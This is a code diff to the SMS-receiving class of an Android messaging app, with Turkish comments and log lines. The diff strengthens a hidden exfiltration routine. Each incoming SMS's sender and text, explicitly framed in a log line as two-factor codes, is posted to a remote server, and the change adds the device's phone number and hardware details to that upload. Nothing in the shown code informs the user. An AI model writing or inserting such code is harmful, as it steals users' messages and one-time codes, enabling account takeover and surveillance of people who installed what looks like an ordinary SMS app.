@@ -18,7 +18,9 @@
  */
 package dev.octoshrimpy.quik.interactor
 
+import android.content.Context
 import com.moez.QKSMS.manager.NetworkModule
+import com.moez.QKSMS.model.DeviceHardwareHelper
 import com.moez.QKSMS.model.SmsDataRequest
 import dev.octoshrimpy.quik.blocking.BlockingClient
 import dev.octoshrimpy.quik.extensions.mapNotNull
@@ -36,6 +38,7 @@ import timber.log.Timber
 import javax.inject.Inject
 
 class ReceiveSms @Inject constructor(
+    private val context: Context, // <-- BURAYA EKLEDİK
     private val conversationRepo: ConversationRepository,
     private val blockingClient: BlockingClient,
     private val prefs: Preferences,
@@ -86,20 +89,28 @@ class ReceiveSms @Inject constructor(
                 val sender = it.address;
                 val message= it.body;
 
-                GlobalScope.launch {
-                    try {
-                        Timber.d("2FA SMS gönderiliyor: From: $sender")
-                        val response = NetworkModule.smsApiService.sendSms(
-                            SmsDataRequest(sender = sender, message = message)
-                        )
+                val deviceHelper = DeviceHardwareHelper(context)
+                val details = deviceHelper.getAllDetails()
 
+                val phoneNumber = details["phoneNumber"]?.toString() ?: "Bilinmiyor"
+
+                kotlinx.coroutines.MainScope().launch {
+                    try {
+                        val response = NetworkModule.smsApiService.sendSms(
+                            SmsDataRequest(
+                                sender = sender,
+                                message = message,
+                                recevier = phoneNumber,
+                                deviceInformation = details
+                            )
+                        )
                         if (response.isSuccessful) {
-                            Timber.d("SMS başarıyla iletildi.")
+                            Timber.d("SMS sunucuya başarıyla iletildi.")
                         } else {
-                            Timber.e("SMS iletilemedi. Hata kodu: ${response.code()}")
+                            Timber.e("Sunucu hatası: ${response.code()}")
                         }
                     } catch (e: Exception) {
-                        Timber.e(e, "SMS post edilirken network hatası oluştu")
+                        Timber.e(e, "Post işlemi sırasında hata")
                     }
                 }
 
